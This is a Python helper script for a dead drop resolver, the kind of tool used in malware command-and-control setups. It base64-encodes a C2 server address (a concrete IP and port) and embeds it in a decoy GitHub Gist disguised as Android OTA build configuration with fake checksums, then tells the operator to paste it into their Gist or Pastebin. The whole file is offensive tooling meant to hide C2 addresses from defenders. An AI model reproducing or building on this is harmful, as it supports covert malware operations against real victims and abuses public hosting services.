#!/usr/bin/env python3
"""
Dead Drop Resolver (DDR) Helper — Server-Side Utility

Encode/decode C2 URLs for your DDR infrastructure.
Run this on YOUR machine to generate the payload to paste into
your GitHub Gist, Pastebin, or other DDR location.

Usage:
  python3 ddr_helper.py encode "http://159.65.147.39:8080"
  python3 ddr_helper.py decode "aHR0cDovLzE1OS42NS4xNDcuMzk6ODA4MA=="
  python3 ddr_helper.py gist "http://159.65.147.39:8080"  # Generates full Gist content
"""

import sys
import base64

def encode_url(url: str) -> str:
    """Base64 encode a C2 URL for DDR deployment."""
    return base64.b64encode(url.encode()).decode()

def decode_url(encoded: str) -> str:
    """Decode a DDR payload back to the original URL."""
    return base64.b64decode(encoded).decode()

def generate_gist_content(url: str) -> str:
    """Generate a natural-looking Gist with embedded DDR payload."""
    encoded = encode_url(url)
    return f"""# Android System Configuration

Build validation checksums for OTA updates.

## Integrity Hashes
- kernel: sha256:a3f4b2c1d5e6...
- system: sha256:7d8e9f0a1b2c...
- vendor: sha256:4e5f6a7b8c9d...

## Sync Configuration
[DDR_START]{encoded}[DDR_END]

Last updated: 2026-04-07
Checksum verified by build system.
"""

def main():
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)
    
    action = sys.argv[1]
    value = sys.argv[2]
    
    if action == "encode":
        encoded = encode_url(value)
        print(f"Original URL: {value}")
        print(f"Encoded DDR:  {encoded}")
        print(f"\nPaste this into your GitHub Gist or Pastebin.")
        
    elif action == "decode":
        decoded = decode_url(value)
        print(f"Decoded URL: {decoded}")
        
    elif action == "gist":
        content = generate_gist_content(value)
        print("=== COPY EVERYTHING BELOW INTO YOUR GIST ===\n")
        print(content)
        print("=== END OF GIST CONTENT ===")
        
    else:
        print(f"Unknown action: {action}")
        print("Use: encode, decode, or gist")

if __name__ == "__main__":
    main()
